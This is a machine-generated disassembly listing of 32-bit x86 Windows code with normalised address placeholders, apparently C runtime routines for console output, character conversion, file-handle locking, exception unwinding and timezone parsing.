mov eax [ rw-data ]
cmp eax 0xffffffff
jne r-xdata
call sub_10035d88
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_10020040
leave
retn
mov ax [ ebp + 0x8 ]
push esi
lea ecx [ ebp - 0x10 ]
push ecx
push 0x1
lea ecx [ ebp + 0x8 ]
push ecx
push eax
call [ WriteConsoleW@IAT ]
test eax eax
jne r-xdata
mov [ rw-data ] 0x1
jmp r-xdata
cmp [ rw-data ] 0x2
jne r-xdata
call [ GetLastError@IAT ]
cmp eax 0x78
jne r-xdata
mov [ rw-data ] esi
sub_10032cac
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
mov esi [ ebp + 0xc ]
xor ebx ebx
cmp esi ebx
je r-xdata
xor eax eax
cmp [ ebp + 0x10 ] ebx
je r-xdata
cmp [ esi ] bl
jne r-xdata
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x10 ]
call sub_10023358
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x14 ] ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
lea eax [ ebp - 0x10 ]
push eax
movzx eax [ esi ]
push eax
call sub_10030985
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
xor ecx ecx
mov [ eax ] cx
xor eax eax
cmp [ ebp + 0x8 ] ebx
setne al
push eax
push [ ebp + 0x8 ]
mov eax [ ebp - 0x10 ]
push 0x1
push esi
push 0x9
push [ eax + 0x4 ]
call [ MultiByteToWideChar@IAT ]
test eax eax
jne r-xdata
mov eax [ ebp - 0x10 ]
mov ecx [ eax + 0xac ]
cmp ecx 0x1
jle r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
movzx cx [ esi ]
mov [ eax ] cx
jmp r-xdata
mov ecx [ ebp + 0x10 ]
cmp ecx [ eax + 0xac ]
jb r-xdata
cmp [ ebp + 0x10 ] ecx
jl r-xdata
xor eax eax
inc eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
call sub_10026065
mov [ eax ] 0x2a
cmp [ ebp - 0x4 ] bl
je r-xdata
cmp [ esi + 0x1 ] bl
je r-xdata
xor edx edx
cmp [ ebp + 0x8 ] ebx
setne dl
push edx
push [ ebp + 0x8 ]
push ecx
push esi
push 0x9
push [ eax + 0x4 ]
call [ MultiByteToWideChar@IAT ]
test eax eax
mov eax [ ebp - 0x10 ]
jne r-xdata
pop esi
pop ebx
leave
retn
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
mov eax [ eax + 0xac ]
cmp [ ebp - 0x4 ] bl
je r-xdata
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
sub_10032ddd
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
push edi
test eax eax
jl r-xdata
call sub_10026065
mov [ eax ] 0x9
call sub_10026078
and [ eax ] 0x0
or eax 0xffffffff
cmp eax [ rw-data ]
jae r-xdata
mov ecx eax
sar ecx 0x5
mov esi eax
and esi 0x1f
lea edi [ ecx * 4 + rw-data ]
mov ecx [ edi ]
shl esi 0x6
cmp [ esi + ecx ] 0xffffffff
jne r-xdata
cmp [ rw-data ] 0x1
push ebx
mov ebx [ ebp + 0xc ]
jne r-xdata
mov eax [ edi ]
mov [ esi + eax ] ebx
xor eax eax
pop ebx
jmp r-xdata
sub eax 0x0
je r-xdata
pop edi
pop esi
pop ebp
retn
push ebx
push 0xfffffff6
dec eax
je r-xdata
push ebx
push 0xfffffff5
jmp r-xdata
dec eax
jne r-xdata
call [ SetStdHandle@IAT ]
push ebx
push 0xfffffff4
jmp r-xdata
sub_10032e5e
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
push ebx
xor ebx ebx
cmp ecx ebx
push esi
push edi
jl r-xdata
call sub_10026065
mov [ eax ] 0x9
call sub_10026078
mov [ eax ] ebx
or eax 0xffffffff
cmp ecx [ rw-data ]
jae r-xdata
mov eax ecx
sar eax 0x5
mov esi ecx
lea edi [ eax * 4 + rw-data ]
mov eax [ edi ]
and esi 0x1f
shl esi 0x6
add eax esi
test [ eax + 0x4 ] 0x1
je r-xdata
cmp [ eax ] 0xffffffff
je r-xdata
cmp [ rw-data ] 0x1
jne r-xdata
mov eax [ edi ]
or [ esi + eax ] 0xffffffff
xor eax eax
jmp r-xdata
sub ecx ebx
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
push ebx
push 0xfffffff6
dec ecx
je r-xdata
push ebx
push 0xfffffff5
jmp r-xdata
dec ecx
jne r-xdata
call [ SetStdHandle@IAT ]
push ebx
push 0xfffffff4
jmp r-xdata
sub_10032ee4
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
push esi
xor esi esi
cmp eax esi
jl r-xdata
call sub_10026078
and [ eax ] 0x0
call sub_10026065
mov [ eax ] 0x9
or eax 0xffffffff
pop ebp
retn
call sub_10026078
mov [ eax ] esi
call sub_10026065
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x9
call sub_10020579
add esp 0x14
or eax 0xffffffff
jmp r-xdata
cmp eax [ rw-data ]
jae r-xdata
pop esi
pop ebp
retn
mov ecx eax
and eax 0x1f
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
shl eax 0x6
add eax ecx
test [ eax + 0x4 ] 0x1
jne r-xdata
mov eax [ eax ]
sub_10032f5b
push 0xc
push r--data
call sub_10028b48
mov edi [ ebp + 0x8 ]
mov eax edi
sar eax 0x5
mov esi edi
and esi 0x1f
shl esi 0x6
add esi [ eax * 4 + rw-data ]
mov [ ebp - 0x1c ] 0x1
xor ebx ebx
cmp [ esi + 0x8 ] ebx
jne r-xdata
cmp [ ebp - 0x1c ] ebx
je r-xdata
push 0xa
call sub_10028f4e
pop ecx
mov [ ebp - 0x4 ] ebx
cmp [ esi + 0x8 ] ebx
jne r-xdata
mov eax [ ebp - 0x1c ]
call sub_10028b8d
retn
mov eax edi
sar eax 0x5
and edi 0x1f
shl edi 0x6
mov eax [ eax * 4 + rw-data ]
lea eax [ eax + edi + 0xc ]
push eax
call [ EnterCriticalSection@IAT ]
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10032ff2
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call sub_1002d8b2
pop ecx
pop ecx
test eax eax
jne r-xdata
inc [ esi + 0x8 ]
mov [ ebp - 0x1c ] ebx
sub_10032ffb
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx eax
and eax 0x1f
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
shl eax 0x6
lea eax [ ecx + eax + 0xc ]
push eax
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
sub_10033022
push 0x18
push r--data
call sub_10028b48
or [ ebp - 0x1c ] 0xffffffff
xor edi edi
mov [ ebp - 0x24 ] edi
push 0xb
call sub_10028e8b
pop ecx
test eax eax
jne r-xdata
push 0xb
call sub_10028f4e
pop ecx
mov [ ebp - 0x4 ] edi
or eax 0xffffffff
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_100331b3
mov eax [ ebp - 0x1c ]
mov esi [ edi * 4 + rw-data ]
test esi esi
je r-xdata
call sub_10028b8d
retn
push 0x40
push 0x20
call sub_10026cea
pop ecx
pop ecx
mov [ ebp - 0x20 ] eax
test eax eax
je r-xdata
mov [ ebp - 0x20 ] esi
mov eax [ edi * 4 + rw-data ]
add eax 0x800
cmp esi eax
jae r-xdata
lea ecx [ edi * 4 + rw-data ]
mov [ ecx ] eax
add [ rw-data ] 0x20
cmp [ ebp - 0x1c ] 0xffffffff
jne r-xdata
test [ esi + 0x4 ] 0x1
jne r-xdata
shl edi 0x5
mov [ ebp - 0x1c ] edi
mov eax edi
sar eax 0x5
mov ecx edi
and ecx 0x1f
shl ecx 0x6
mov eax [ eax * 4 + rw-data ]
mov [ eax + ecx + 0x4 ] 0x1
push edi
call sub_10032f5b
pop ecx
test eax eax
jne r-xdata
mov [ eax + 0x4 ] 0x0
or [ eax ] 0xffffffff
mov [ eax + 0x5 ] 0xa
and [ eax + 0x8 ] 0x0
add eax 0x40
mov [ ebp - 0x20 ] eax
jmp r-xdata
inc edi
jmp r-xdata
add esi 0x40
jmp r-xdata
cmp [ esi + 0x8 ] 0x0
jne r-xdata
or [ ebp - 0x1c ] 0xffffffff
mov edx [ ecx ]
add edx 0x800
cmp eax edx
jae r-xdata
mov [ ebp - 0x28 ] edi
cmp edi 0x40
jge r-xdata
cmp [ ebp - 0x24 ] 0x0
jne r-xdata
push 0xa
call sub_10028f4e
pop ecx
xor ebx ebx
inc ebx
mov [ ebp - 0x4 ] ebx
cmp [ esi + 0x8 ] 0x0
jne r-xdata
lea ebx [ esi + 0xc ]
push ebx
call [ EnterCriticalSection@IAT ]
test [ esi + 0x4 ] 0x1
je r-xdata
and [ ebp - 0x4 ] 0x0
call sub_100330f5
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call sub_1002d8b2
pop ecx
pop ecx
test eax eax
jne r-xdata
cmp [ ebp - 0x24 ] 0x0
jne r-xdata
push ebx
call [ LeaveCriticalSection@IAT ]
inc [ esi + 0x8 ]
mov [ ebp - 0x24 ] ebx
jmp r-xdata
mov [ esi + 0x4 ] 0x1
or [ esi ] 0xffffffff
sub esi [ edi * 4 + rw-data ]
sar esi 0x6
mov eax edi
shl eax 0x5
add esi eax
mov [ ebp - 0x1c ] esi
sub_100331bc
push ebp
mov ebp esp
push ebx
push esi
push edi
push ebp
push 0x0
push 0x0
push r-xdata
push [ ebp + 0x8 ]
call RtlUnwind
pop ebp
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_100331dc
mov ecx [ esp + 0x4 ]
test [ ecx + 0x4 ] 0x6
mov eax 0x1
je r-xdata
retn
mov eax [ esp + 0x14 ]
mov ecx [ eax - 0x4 ]
xor ecx eax
call sub_10020040
push ebp
mov ebp [ eax + 0x10 ]
mov edx [ eax + 0x28 ]
push edx
mov edx [ eax + 0x24 ]
push edx
call sub_10033221
add esp 0x8
pop ebp
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x10 ]
mov [ edx ] eax
mov eax 0x3
sub_10033221
push ebx
push esi
push edi
mov eax [ esp + 0x10 ]
push ebp
push eax
push 0xfffffffe
push sub_100331dc
push [ fs : 0x0 ]
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x4 ]
mov [ fs : 0x0 ] eax
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x18
pop edi
pop esi
pop ebx
retn
cmp [ esp + 0x2c ] 0xffffffff
je r-xdata
lea esi [ esi + esi * 2 ]
mov ecx [ ebx + esi * 4 ]
mov [ esp + 0xc ] ecx
mov [ eax + 0xc ] ecx
cmp [ ebx + esi * 4 + 0x4 ] 0x0
jne r-xdata
cmp esi [ esp + 0x2c ]
jbe r-xdata
jmp r-xdata
push 0x101
mov eax [ ebx + esi * 4 + 0x8 ]
call sub_100332d1
mov eax [ ebx + esi * 4 + 0x8 ]
call sub_100332f0
mov eax [ esp + 0x28 ]
mov ebx [ eax + 0x8 ]
mov esi [ eax + 0xc ]
cmp esi 0xffffffff
je r-xdata
sub_100332c8
push ebx
push ecx
mov ebx rw-data
jmp r-xdata
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0x4 ] eax
mov [ ebx + 0xc ] ebp
push ebp
push ecx
push eax
pop eax
pop ecx
pop ebp
pop ecx
pop ebx
retn 0x4
sub_100332d1
push ebx
push ecx
mov ebx rw-data
mov ecx [ esp + 0xc ]
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0x4 ] eax
mov [ ebx + 0xc ] ebp
push ebp
push ecx
push eax
pop eax
pop ecx
pop ebp
pop ecx
pop ebx
retn 0x4
sub_100332fc
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
xor esi esi
cmp eax esi
jne r-xdata
mov ecx [ rw-data ]
mov [ eax ] ecx
xor eax eax
call sub_10026065
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_10020579
add esp 0x14
push 0x16
pop eax
jmp r-xdata
pop esi
pop ebp
retn
sub_10033335
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
xor esi esi
cmp eax esi
jne r-xdata
mov ecx [ rw-data ]
mov [ eax ] ecx
xor eax eax
call sub_10026065
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_10020579
add esp 0x14
push 0x16
pop eax
jmp r-xdata
pop esi
pop ebp
retn
sub_1003336e
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
xor esi esi
cmp eax esi
jne r-xdata
mov ecx [ rw-data ]
mov [ eax ] ecx
xor eax eax
call sub_10026065
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_10020579
add esp 0x14
push 0x16
pop eax
jmp r-xdata
pop esi
pop ebp
retn
sub_100333f2
push 0x2c
push r--data
call sub_10028b48
xor ebx ebx
mov [ ebp - 0x38 ] ebx
mov [ ebp - 0x2c ] ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x28 ] ebx
mov [ ebp - 0x20 ] ebx
push 0x7
call sub_10028f4e
pop ecx
mov [ ebp - 0x4 ] ebx
call sub_100333b9
mov [ ebp - 0x20 ] eax
lea eax [ ebp - 0x1c ]
push eax
call sub_1003336e
pop ecx
cmp eax ebx
je r-xdata
lea eax [ ebp - 0x24 ]
push eax
call sub_100332fc
pop ecx
cmp eax ebx
je r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_10020451
add esp 0x14
lea eax [ ebp - 0x28 ]
push eax
call sub_10033335
pop ecx
cmp eax ebx
je r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_10020451
add esp 0x14
call sub_10026495
mov [ ebp - 0x34 ] eax
mov [ rw-data ] ebx
or edi 0xffffffff
mov [ rw-data ] edi
mov [ rw-data ] edi
push r--data
call sub_1003607f
pop ecx
mov esi eax
mov [ ebp - 0x3c ] esi
cmp esi ebx
je r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_10020451
add esp 0x14
mov eax [ rw-data ]
cmp eax ebx
je r-xdata
cmp [ esi ] bl
je r-xdata
push rw-data
call [ GetTimeZoneInformation@IAT ]
cmp eax edi
je r-xdata
push eax
call sub_100207fd
pop ecx
mov [ rw-data ] ebx
mov eax [ rw-data ]
cmp eax ebx
je r-xdata
mov [ ebp - 0x2c ] 0x1
xor ecx ecx
inc ecx
mov [ rw-data ] ecx
mov eax [ rw-data ]
imul eax eax 0x3c
mov [ ebp - 0x1c ] eax
cmp [ rw-data ] bx
je r-xdata
push esi
call sub_100200e0
inc eax
push eax
call sub_10026ca5
pop ecx
pop ecx
mov [ rw-data ] eax
cmp eax ebx
je r-xdata
push eax
push esi
call sub_100232d0
pop ecx
pop ecx
test eax eax
je r-xdata
call sub_10028b8d
retn
push 0x3
push esi
push 0x40
mov edi [ ebp - 0x20 ]
push [ edi ]
call sub_1002f63b
add esp 0x10
test eax eax
je r-xdata
cmp [ rw-data ] bx
je r-xdata
mov edx [ rw-data ]
imul edx edx 0x3c
add eax edx
mov [ ebp - 0x1c ] eax
push esi
push esi
call sub_100200e0
pop ecx
inc eax
push eax
push [ rw-data ]
call sub_1002776c
add esp 0xc
cmp eax ebx
je r-xdata
mov eax [ rw-data ]
cmp eax ebx
je r-xdata
add esi 0x3
cmp [ esi ] 0x2d
jne r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_10020451
add esp 0x14
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x28 ] ebx
mov eax [ rw-data ]
cmp eax ebx
je r-xdata
push [ ebp - 0x1c ]
call sub_100333e1
push [ ebp - 0x24 ]
call sub_100333bf
push [ ebp - 0x28 ]
call sub_100333d0
add esp 0xc
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1003369e
cmp [ ebp - 0x2c ] ebx
jne r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_10020451
add esp 0x14
jmp r-xdata
push eax
call sub_100207fd
pop ecx
push esi
call sub_100338e7
pop ecx
imul eax eax 0xe10
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x38 ] 0x1
inc esi
mov eax [ ebp - 0x20 ]
mov eax [ eax ]
mov [ eax ] bl
cmp [ ebp - 0x30 ] ebx
jne r-xdata
mov [ ebp - 0x24 ] ecx
sub eax [ rw-data ]
imul eax eax 0x3c
mov [ ebp - 0x28 ] eax
jmp r-xdata
inc esi
jmp r-xdata
cmp al 0x30
jl r-xdata
mov eax [ ebp - 0x20 ]
mov eax [ eax + 0x4 ]
mov [ eax ] bl
cmp [ ebp - 0x30 ] ebx
jne r-xdata
mov eax [ ebp - 0x20 ]
mov eax [ eax ]
mov [ eax + 0x3f ] bl
jmp r-xdata
lea eax [ ebp - 0x30 ]
push eax
push ebx
push 0x3f
mov eax [ ebp - 0x20 ]
push [ eax ]
push edi
push rw-data
push ebx
push [ ebp - 0x34 ]
mov edi [ WideCharToMultiByte@IAT ]
call edi
test eax eax
je r-xdata
mov al [ esi ]
cmp al 0x2b
je r-xdata
cmp [ esi ] 0x3a
jne r-xdata
cmp al 0x39
jg r-xdata
mov eax [ ebp - 0x20 ]
mov eax [ eax + 0x4 ]
mov [ eax + 0x3f ] bl
jmp r-xdata
lea eax [ ebp - 0x30 ]
push eax
push ebx
push 0x3f
mov eax [ ebp - 0x20 ]
push [ eax + 0x4 ]
push 0xffffffff
push rw-data
push ebx
push [ ebp - 0x34 ]
call edi
test eax eax
je r-xdata
cmp [ ebp - 0x38 ] ebx
je r-xdata
inc esi
push esi
call sub_100338e7
pop ecx
imul eax eax 0x3c
add [ ebp - 0x1c ] eax
jmp r-xdata
movsx eax [ esi ]
mov [ ebp - 0x24 ] eax
cmp eax ebx
je r-xdata
neg [ ebp - 0x1c ]
mov al [ esi ]
cmp al 0x30
jge r-xdata
mov eax [ edi + 0x4 ]
mov [ eax ] bl
push 0x3
push esi
push 0x40
push [ edi + 0x4 ]
call sub_1002f63b
add esp 0x10
test eax eax
je r-xdata
cmp al 0x39
jg r-xdata
cmp [ esi ] 0x3a
jne r-xdata
mov esi [ ebp - 0x1c ]
call sub_100333b3
mov [ eax ] esi
mov esi [ ebp - 0x24 ]
call sub_100333a7
mov [ eax ] esi
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_10020451
add esp 0x14
jmp r-xdata
inc esi
inc esi
push esi
call sub_100338e7
pop ecx
add [ ebp - 0x1c ] eax
jmp r-xdata
mov al [ esi ]
cmp al 0x30
jge r-xdata
cmp al 0x39
jg r-xdata
inc esi
sub_10033738
push 0x8
push r--data
call sub_10028b48
xor esi esi
cmp [ rw-data ] esi
jne r-xdata
call sub_10028b8d
retn
push 0x6
call sub_10028f4e
pop ecx
mov [ ebp - 0x4 ] esi
cmp [ rw-data ] esi
jne r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1003377e
call sub_100333f2
inc [ rw-data ]
sub_10033787
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
push edi
movzx ecx [ edx ]
lea edi [ ecx - 0x41 ]
inc edx
cmp edi 0x19
ja r-xdata
add eax 0x20
test eax eax
je r-xdata
add ecx 0x20
pop edi
sub eax ecx
pop esi
pop ebp
retn
cmp eax ecx
je r-xdata
movzx eax [ esi ]
lea ecx [ eax - 0x41 ]
inc esi
cmp ecx 0x19
ja r-xdata
sub_100337c0
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x10 ]
call sub_10023358
xor ebx ebx
cmp [ ebp + 0x8 ] ebx
jne r-xdata
push edi
mov edi [ ebp + 0xc ]
cmp edi ebx
jne r-xdata
call sub_10026065
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_10020579
add esp 0x14
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x14 ] ebx
jne r-xdata
call sub_10026065
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_10020579
add esp 0x14
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
push esi
push edi
push [ ebp + 0x8 ]
call sub_10033787
pop ecx
pop ecx
jmp r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
pop ebx
leave
retn
sub esi eax
mov eax esi
pop esi
cmp esi eax
je r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
pop edi
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
mov eax [ ebp + 0x8 ]
movzx eax [ eax ]
lea ecx [ ebp - 0x10 ]
push ecx
push eax
call sub_1002704b
inc [ ebp + 0x8 ]
mov esi eax
movzx eax [ edi ]
lea ecx [ ebp - 0x10 ]
push ecx
push eax
call sub_1002704b
add esp 0x10
inc edi
cmp esi ebx
je r-xdata
sub_10033895
mov edi edi
push ebp
mov ebp esp
push esi
xor esi esi
cmp [ rw-data ] esi
jne r-xdata
push esi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_100337c0
add esp 0xc
cmp [ ebp + 0x8 ] esi
jne r-xdata
cmp [ ebp + 0xc ] esi
je r-xdata
call sub_10026065
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_10020579
add esp 0x14
mov eax 0x7fffffff
jmp r-xdata
pop esi
pop ebp
jmp sub_10033787
pop esi
pop ebp
retn
sub_100338fd
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
xor ebx ebx
push esi
push edi
cmp [ ebp + 0x10 ] ebx
je r-xdata
xor eax eax
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x10 ]
call sub_10023358
cmp [ ebp + 0x8 ] ebx
jne r-xdata
mov edi [ ebp + 0xc ]
cmp edi ebx
je r-xdata
call sub_10026065
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_10020579
add esp 0x14
cmp [ ebp - 0x4 ] bl
je r-xdata
mov esi 0x7fffffff
cmp [ ebp + 0x10 ] esi
jbe r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x14 ] ebx
jne r-xdata
call sub_10026065
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_10020579
add esp 0x14
cmp [ ebp - 0x4 ] bl
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov eax [ ebp + 0x8 ]
movzx eax [ eax ]
lea ecx [ ebp - 0x10 ]
push ecx
push eax
call sub_1002704b
inc [ ebp + 0x8 ]
mov esi eax
movzx eax [ edi ]
lea ecx [ ebp - 0x10 ]
push ecx
push eax
call sub_1002704b
add esp 0x10
inc edi
dec [ ebp + 0x10 ]
je r-xdata
push [ ebp + 0x10 ]
push edi
push [ ebp + 0x8 ]
call sub_10036110
add esp 0xc
mov eax esi
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
sub esi eax
mov eax esi
jmp r-xdata
cmp esi ebx
je r-xdata
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
cmp esi eax
je r-xdata
sub_100339ef
mov edi edi
push ebp
mov ebp esp
push esi
xor esi esi
cmp [ rw-data ] esi
jne r-xdata
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_100338fd
add esp 0x10
cmp [ ebp + 0x8 ] esi
jne r-xdata
cmp [ ebp + 0xc ] esi
je r-xdata
call sub_10026065
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_10020579
add esp 0x14
mov eax 0x7fffffff
jmp r-xdata
cmp [ ebp + 0x10 ] 0x7fffffff
ja r-xdata
pop esi
pop ebp
retn
pop esi
pop ebp
jmp sub_10036110
sub_10033a4d
mov edi edi
push ebp
mov ebp esp
mov eax 0xffff
sub esp 0x14
cmp [ ebp + 0x8 ] ax
jne r-xdata
mov eax 0x100
cmp [ ebp + 0x8 ] ax
jae r-xdata
and [ ebp - 0x4 ] 0x0
jmp r-xdata
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x14 ]
call sub_10023358
mov eax [ ebp - 0x14 ]
push [ eax + 0x14 ]
push [ eax + 0x4 ]
lea eax [ ebp - 0x4 ]
push eax
push 0x1
lea eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x14 ]
push 0x1
push eax
call sub_10024d47
add esp 0x1c
test eax eax
jne r-xdata
movzx eax [ ebp + 0x8 ]
mov ecx [ rw-data ]
mov ax [ ecx + eax * 2 ]
and ax [ ebp + 0xc ]
movzx eax ax
mov [ ebp - 0x4 ] eax
jmp r-xdata
movzx eax [ ebp - 0x4 ]
movzx ecx [ ebp + 0xc ]
and eax ecx
leave
retn
cmp [ ebp - 0x8 ] 0x0
je r-xdata
and [ ebp - 0x4 ] eax
mov eax [ ebp - 0xc ]
and [ eax + 0x70 ] 0xfffffffd
sub_10033ae0
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0x8 ]
xor eax eax
or ecx 0xffffffff
[ edi ]
add ecx 0x1
neg ecx
sub edi 0x1
mov al [ ebp + 0xc ]
std
[ edi ]
add edi 0x1
cmp [ edi ] al
je r-xdata
mov eax edi
xor eax eax
jmp r-xdata
cld
pop edi
leave
retn
sub_10033b0d
mov edi edi
push ebp
mov ebp esp
sub esp 0x28
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
push [ ebp + 0x10 ]
mov edi [ ebp + 0xc ]
lea ecx [ ebp - 0x24 ]
call sub_10023358
lea eax [ ebp - 0x24 ]
push eax
xor ebx ebx
push ebx
push ebx
push ebx
push ebx
push edi
lea eax [ ebp - 0x28 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_10034a63
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x10 ]
push esi
push eax
call sub_10033fdb
add esp 0x28
test [ ebp - 0x14 ] 0x3
jne r-xdata
test [ ebp - 0x14 ] 0x1
jne r-xdata
cmp eax 0x1
jne r-xdata
cmp [ ebp - 0x18 ] bl
je r-xdata
test [ ebp - 0x14 ] 0x2
jne r-xdata
cmp eax 0x2
jne r-xdata
cmp [ ebp - 0x18 ] bl
je r-xdata
push 0x4
jmp r-xdata
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ ebp - 0x18 ] bl
je r-xdata
push 0x3
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
pop eax
jmp r-xdata
xor eax eax
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10020040
leave
retn
sub_10033bb5
mov edi edi
push ebp
mov ebp esp
sub esp 0x28
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
push [ ebp + 0x10 ]
mov edi [ ebp + 0xc ]
lea ecx [ ebp - 0x24 ]
call sub_10023358
lea eax [ ebp - 0x24 ]
push eax
xor ebx ebx
push ebx
push ebx
push ebx
push ebx
push edi
lea eax [ ebp - 0x28 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_10034a63
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x10 ]
push esi
push eax
call sub_1003451f
add esp 0x28
test [ ebp - 0x14 ] 0x3
jne r-xdata
test [ ebp - 0x14 ] 0x1
jne r-xdata
cmp eax 0x1
jne r-xdata
cmp [ ebp - 0x18 ] bl
je r-xdata
test [ ebp - 0x14 ] 0x2
jne r-xdata
cmp eax 0x2
jne r-xdata
cmp [ ebp - 0x18 ] bl
je r-xdata
push 0x4
jmp r-xdata
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ ebp - 0x18 ] bl
je r-xdata
push 0x3
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
pop eax
jmp r-xdata
xor eax eax
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10020040
leave
retn
sub_10033c5d
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x14 ]
push ebx
push esi
mov esi [ ebp + 0x8 ]
xor ebx ebx
push edi
mov edi [ ecx + 0xc ]
cmp esi ebx
jne r-xdata
cmp [ ebp + 0xc ] ebx
jbe r-xdata
call sub_10026065
push 0x16
pop esi
mov [ eax ] esi
mov edx [ ebp + 0x10 ]
cmp edx ebx
mov [ esi ] bl
jle r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
xor eax eax
mov eax edx
jmp r-xdata
cmp edx ebx
mov [ esi ] 0x30
lea eax [ esi + 0x1 ]
jle r-xdata
call sub_10026065
push 0x22
pop ecx
